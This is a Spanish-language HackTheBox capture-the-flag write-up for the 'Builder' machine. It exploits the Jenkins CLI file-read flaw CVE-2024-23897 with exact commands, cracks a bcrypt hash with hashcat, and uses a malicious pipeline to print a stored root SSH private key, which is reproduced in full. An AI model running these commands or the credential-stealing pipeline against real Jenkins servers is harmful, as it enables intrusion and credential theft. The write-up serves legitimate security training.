Propiedades:
- OS: Linux
- Plataforma: HackTheBox
- Nivel: Medium
- Tags: #jenkins #CVE-2024-23897 #pipeline #password-cracking

![](assets/Pasted%20image%2020260204154447.png)

## Reconocimiento

Comienzo tirando un ping para comprobar la conectividad.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/builder]
└─$ ping -c 1 10.129.230.220
PING 10.129.230.220 (10.129.230.220) 56(84) bytes of data.
64 bytes from 10.129.230.220: icmp_seq=1 ttl=63 time=86.3 ms

--- 10.129.230.220 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 86.343/86.343/86.343/0.000 **ms**
```

Ahora tiro un escaneo con nmap para ver que puertos tenemos abiertos.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/builder]
└─$ sudo nmap -p- -Pn -n -sS --min-rate 5000 -vvv 10.129.230.220 -oG nmap/allPorts

PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 63
8080/tcp open  http-proxy syn-ack ttl 62
```

Sobre los puertos abiertos realizo un segundo escaneo mas profundo para detectar servicios, versiones y correr un conjunto de scripts de reconocimiento.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/builder]
└─$ sudo nmap -p 22,8080 -sV -sC -Pn -n -sS -vvv 10.129.230.220 -oN nmap/target

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
8080/tcp open  http    syn-ack ttl 62 Jetty 10.0.18
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
| http-robots.txt: 1 disallowed entry
|_/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Dashboard [Jenkins]
|_http-server-header: Jetty(10.0.18)
|_http-favicon: Unknown favicon MD5: 23E8C7BD78E8CD826C5A6073B15068B1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeración

### Puerto 8080 HTTP.

En este puerto esta corriendo Jenkins

- Jenkins es una herramienta para automatizar el despliegue de software y la ejecución de tests.
- Podemos ver que se esta usando la versión 2.441 de Jenkins.

![](assets/Pasted%20image%2020260203205230.png)

En usuarios existe un usuario llamado jennifer.

![](assets/Pasted%20image%2020260203212212.png)

En credenciales tenemos una clave SSH que presuntamente pertenece al usuario root.

![](assets/Pasted%20image%2020260203212257.png)

## Acceso Inicial.

Jenkins en su versión 2.441 es vulnerable al [CVE-2024-23897](https://www.incibe.es/incibe-cert/alerta-temprana/vulnerabilidades/cve-2024-23897).

La vulnerabilidad existe en la herramienta CLI de Jenkins, la cual puede ser utilizada para leer archivos arbitrariamente.

Podemos bajar la CLI desde la siguiente URL:

```bash
http://10.129.230.220:8080/jnlpJars/jenkins-cli.jar
```

Y la CLI la podemos utilizar para leer archivos utilizando el "@" seguido de la ruta del archivo que queremos leer.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/builder]
└─$ java -jar jenkins-cli.jar -s http://10.129.230.220:8080/ -http connect-node @/etc/passwd

www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin: No such agent "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin" exists.
root:x:0:0:root:/root:/bin/bash: No such agent "root:x:0:0:root:/root:/bin/bash" exists.
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin: No such agent "mail:x:8:8:mail:/var/mail:/usr/sbin/nologin" exists.
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin: No such agent "backup:x:34:34:backup:/var/backups:/usr/sbin/nologin" exists.
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin: No such agent "_apt:x:42:65534::/nonexistent:/usr/sbin/nologin" exists.
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin: No such agent "nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin" exists.
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin: No such agent "lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin" exists.
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin: No such agent "uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin" exists.
bin:x:2:2:bin:/bin:/usr/sbin/nologin: No such agent "bin:x:2:2:bin:/bin:/usr/sbin/nologin" exists.
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin: No such agent "news:x:9:9:news:/var/spool/news:/usr/sbin/nologin" exists.
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin: No such agent "proxy:x:13:13:proxy:/bin:/usr/sbin/nologin" exists.
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin: No such agent "irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin" exists.
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin: No such agent "list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin" exists.
jenkins:x:1000:1000::/var/jenkins_home:/bin/bash: No such agent "jenkins:x:1000:1000::/var/jenkins_home:/bin/bash" exists.
games:x:5:60:games:/usr/games:/usr/sbin/nologin: No such agent "games:x:5:60:games:/usr/games:/usr/sbin/nologin" exists.
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin: No such agent "man:x:6:12:man:/var/cache/man:/usr/sbin/nologin" exists.
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin: No such agent "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin" exists.
sys:x:3:3:sys:/dev:/usr/sbin/nologin: No such agent "sys:x:3:3:sys:/dev:/usr/sbin/nologin" exists.
sync:x:4:65534:sync:/bin:/bin/sync: No such agent "sync:x:4:65534:sync:/bin:/bin/sync" exists.
```

Normalmente Jenkins guarda una password inicial en el archivo `/secrets/initialAdminPassword`, pero esta vez no hubo nada.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/builder/content]
└─$ java -jar jenkins-cli.jar -s http://10.129.230.220:8080/ -http connect-node @/var/jenkins_home/secrets/initialAdminPassword

ERROR: No such file: /var/jenkins_home/secrets/initialAdminPassword
```

Jenkins también guarda informacion de sus usuarios en `/users/users.xml`

- Podemos ver que existe un usuario **jennifer_12108429903186576833** que coincide con el que vimos en la web.

```xml
┌──(wndr㉿wndr)-[~/Machines/hackthebox/builder/content]
└─$ java -jar jenkins-cli.jar -s http://10.129.230.220:8080/ -http connect-node @/var/jenkins_home/users/users.xml

<?xml version='1.1' encoding='UTF-8'?>: No such agent "<?xml version='1.1' encoding='UTF-8'?>" exists.
      <string>jennifer_12108429903186576833</string>: No such agent "      <string>jennifer_12108429903186576833</string>" exists.
  <idToDirectoryNameMap class="concurrent-hash-map">: No such agent "  <idToDirectoryNameMap class="concurrent-hash-map">" exists.
    <entry>: No such agent "    <entry>" exists.
      <string>jennifer</string>: No such agent "      <string>jennifer</string>" exists.
  <version>1</version>: No such agent "  <version>1</version>" exists.
</hudson.model.UserIdMapper>: No such agent "</hudson.model.UserIdMapper>" exists.
  </idToDirectoryNameMap>: No such agent "  </idToDirectoryNameMap>" exists.
<hudson.model.UserIdMapper>: No such agent "<hudson.model.UserIdMapper>" exists.                                                                                                                                       </entry>: No such agent "    </entry>" exists.
```

Todos los usuarios locales de Jenkins viven dentro del directorio `/users` y cada uno de ellos tiene un archivo `config.xml` que contiene el hash de contraseña del usuario.

- Podemos leer este archivo y ver el hash bcrypt: 

```xml
┌──(wndr㉿wndr)-[~/Machines/hackthebox/builder/content]
└─$ java -jar jenkins-cli.jar -s http://10.129.230.220:8080/ -http connect-node @/var/jenkins_home/users/jennifer_12108429903186576833/config.xml

<passwordHash>#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a</passwordHash>: No such agent "      <passwordHash>#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a</passwordHash>" exists.
```

Este hash lo puedo crackear con el modo 3200 de `hashcat`:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/builder/content]
└─$ hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
5

$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a:princess
```

- Credenciales jennifer / princess

## Escalada de Privilegios.

Con estas credenciales puedo logearme a Jenkins

![](assets/Pasted%20image%2020260203213250.png)

En MyViews puedo ver que existe un pipeline llamado SSH.

![](assets/Pasted%20image%2020260203214953.png)

Yo puedo abusar de este pipeline editándolo y colocando un pipeline malicioso que utilice la credencial SSH guardada y la imprima por consola:

Pipeline:

```bash
pipeline {
  agent any
  stages {
    stage('steal') {
      steps {
        withCredentials([sshUserPrivateKey(
          credentialsId: '1',
          keyFileVariable: 'KEY',
          usernameVariable: 'USER'
        )]) {
          sh '''
            echo "USER=$USER"
            cat $KEY
          '''
        }
      }
    }
  }
}
```

Esto lo voy a colocar en MyViews -> All -> SSH -> Configuration -> Pipeline:

![](assets/Pasted%20image%2020260203214009.png)

Al momento de guardar el pipeline puedo ejecutarlo dándole al botón de Build Now y abajo a la izquierda me saldrá un check verde de que todo se ejecuto correctamente:

![](assets/Pasted%20image%2020260203214146.png)

Puedo darle al check verde y ver el output de mi pipeline para ver la clave SSH:

![](assets/Pasted%20image%2020260203214207.png)

Output:

```bash
Started by user jennifer
[Pipeline] Start of Pipeline
[Pipeline] node
Running on Jenkins in /var/jenkins_home/workspace/ssh
[Pipeline] {
[Pipeline] stage
[Pipeline] { (steal)
[Pipeline] withCredentials
Masking supported pattern matches of $KEY
[Pipeline] {
[Pipeline] sh
+ echo USER=root
USER=root
+ cat ****
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----

[Pipeline] }
[Pipeline] // withCredentials
[Pipeline] }
[Pipeline] // stage
[Pipeline] }
[Pipeline] // node
[Pipeline] End of Pipeline
Finished: SUCCESS
```

Ahora me puedo guardar la clave y conectarme por SSH.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/builder]
└─$ chmod 600 id_rsa

┌──(wndr㉿wndr)-[~/Machines/hackthebox/builder]
└─$ ssh -i id_rsa root@10.129.230.220

root@builder:~# whoami
root
root@builder:~# id
uid=0(root) gid=0(root) groups=0(root)
```

Flags.

```bash
root@builder:~# cat root.txt
9319e85096f6ff8fd96ae900b983426a
root@builder:/home/jennifer# cat user.txt
efdf3800aee5ce5f44c0894dcf47a9f1
```

***PWNED***

![](assets/Pasted%20image%2020260204154526.png)